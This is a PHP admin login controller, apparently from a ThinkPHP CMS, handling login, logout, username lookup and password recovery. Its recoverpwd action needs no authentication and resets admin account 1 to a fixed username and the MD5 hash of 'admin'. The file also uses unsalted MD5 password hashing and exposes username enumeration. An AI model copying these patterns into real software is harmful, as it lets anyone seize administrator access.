<?php
namespace app\fladmin\controller;
use think\Controller;
use think\Session;

class Login extends Controller
{
    /**
     * 登录页面
     */
	public function index()
	{
		if(Session::has('admin_user_info'))
		{
			header("Location: ".CMS_ADMIN);
			exit;
		}
		
        return $this->fetch();
    }
    
    /**
     * 登录处理页面
     */
    public function dologin()
    {
        if(!empty($_POST["username"])){$username = $_POST["username"];}else{$username='';}//用户名
        if(!empty($_POST["pwd"])){$pwd = md5($_POST["pwd"]);}else{$pwd='';}//密码
		
		//$sql = "(username = '".$username."' and pwd = '".$pwd."') or (email = '".$username."' and pwd = '".$pwd."')";
        $admin = db("admin")->where(function($query) use ($username,$pwd){$query->where('username',$username)->where('pwd',$pwd);})->whereOr(function($query) use ($username,$pwd){$query->where('email',$username)->where('pwd',$pwd);})->find();
        
        if($admin)
        {
			$admin['rolename'] = db("admin_role")->where("id=".$admin['role_id'])->find()['name'];
			
            Session::set("admin_user_info", $admin);
			
			db("admin")->where("id=".$admin['id'])->setField('logintime',time());
			
			$this->success('登录成功！', CMS_ADMIN , 1);
        }
        else
        {
            $this->error('登录失败！请重新登录！！', CMS_ADMIN.'Login' ,1);
        }
    }

    //退出登录
    public function loginout()
    {
        Session::clear(); // 清除session
		$this->success('退出成功！', '/');
    }
    
    //密码恢复
    public function recoverpwd()
    {
        $data["username"] = "admin888";
        $data["pwd"] = "21232f297a57a5a743894a0e4a801fc3";
        
        if(db('admin')->where("id=1")->update($data))
        {
            $this->success('密码恢复成功！', CMS_ADMIN.'Login' , 1);
        }
		else
		{
			$this->error('密码恢复失败！', CMS_ADMIN.'Login' , 3);
		}
    }
	
	/**
     * 判断用户名是否存在
     */
    public function userexists()
    {
		$map['username']="";
        if(isset($_POST["username"]) && !empty($_POST["username"]))
        {
            $map['username'] = $_POST["username"];
        }
		else
		{
			return 0;
		}
        
        return db("admin")->where($map)->count();
    }
}